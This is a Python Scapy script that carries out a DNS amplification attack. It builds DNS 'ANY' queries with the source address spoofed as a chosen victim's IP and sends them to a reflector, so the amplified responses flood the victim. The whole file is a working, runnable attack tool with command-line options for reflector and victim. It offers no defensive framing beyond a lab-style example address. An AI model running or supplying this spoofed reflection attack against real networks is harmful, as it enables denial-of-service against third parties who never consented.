#!/usr/bin/env python3

from scapy.all import *
import argparse

def create_dns_amplification_packet(reflector_ip, victim_ip):
    # DNS Request to amplify
    dns_query = DNS(rd=1, qd=DNSQR(qname="example.com", qtype="ANY"))
    
    # UDP and IP layers
    udp = UDP(sport=RandShort(), dport=53)
    ip = IP(src=victim_ip, dst=reflector_ip)

    # Combine and return full packet
    packet = ip / udp / dns_query
    return packet

def main():
    parser = argparse.ArgumentParser(description="Amplification attack using DNS")
    parser.add_argument("reflector", help="IP address of the reflector (e.g., 192.168.56.2)")
    parser.add_argument("--victim", help="Victim IP address (default: send response back to attacker)")
    parser.add_argument("--service", default="dns", help="Service to use (dns, ntp, snmp)")
    args = parser.parse_args()

    if args.service != "dns":
        print("Only DNS is implemented. SNMP and NTP not yet supported.")
        return

    victim_ip = args.victim if args.victim else get_if_addr(conf.iface)
    pkt = create_dns_amplification_packet(args.reflector, victim_ip)

    print(f"Sending spoofed DNS packet from {victim_ip} to {args.reflector}...")
    send(pkt, verbose=1)

if __name__ == "__main__":
    main()
